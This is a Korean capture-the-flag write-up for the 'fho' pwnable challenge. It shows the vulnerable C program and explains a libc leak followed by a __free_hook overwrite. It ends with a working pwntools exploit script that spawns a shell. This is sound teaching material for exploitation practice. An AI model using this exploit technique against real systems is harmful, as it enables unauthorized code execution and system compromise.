fho 라이트업
============

## 보호기법 확인

<img width="708" height="187" alt="image" src="https://github.com/user-attachments/assets/99105e1f-a5a3-40d4-876a-460cb734a5e3" />


## 코드 분석


```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

셸을 얻으려면
* 스택의 어떤 값을 읽을 수 있다
* 임의의 주소에 임의 값을 쓸 수 있다
* 임의의 주소를 해제할 수 있다



## 익스플로잇 설계

### 라이브러리의 변수/함수들의 주소

<img width="1380" height="140" alt="image" src="https://github.com/user-attachments/assets/7e079c55-b495-43b0-b418-c445f6cdb0f7" />

__free_hook, system 함수,"/bin/sh" 문자열의 오프셋을 얻어낸다.


메모리상에서 이들의 주소를 계산하려면 프로세스에 매핑된 libc 파일의 베이스 주소를 알아야 한다. 
거기에 오프셋을 더해 메모리상 주소를 구할 수 있다.   

main함수는 __libc_start_main이라는 라이브러리 함수가 호출하므로 main 함수 스택 프레임에 존재하는 반환 주소를 읽으면 
그 주소를 기반으로 libc 베이스 주소를 계산할 수 있고 이에 더해 변수와 함수들의 주소를 계산할 수 있다. 

<img width="1338" height="197" alt="image" src="https://github.com/user-attachments/assets/c80f490b-c6a3-4789-a16f-fd79bff262a0" />


### 셸 획득

__free_hook의 값을 system 함수의 주소를 덮어쓰고 "/bin/sh"를 해제해서 셸을 획득할 수 있다.


## 익스플로잇 


### 라이브러리의 변수/함수들의 주소

<img width="1332" height="281" alt="image" src="https://github.com/user-attachments/assets/d6a602d3-8346-467c-832c-7187bf7008e5" />

main함수의 반환 주소는 0x7ffff7dce1ca이고 출력해보면 오프셋은 122


### 익스플로잇 코드


```python
#!/usr/bin/env python3

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 122)
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)

# [2] Overwrite `free_hook` with `system`
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
```

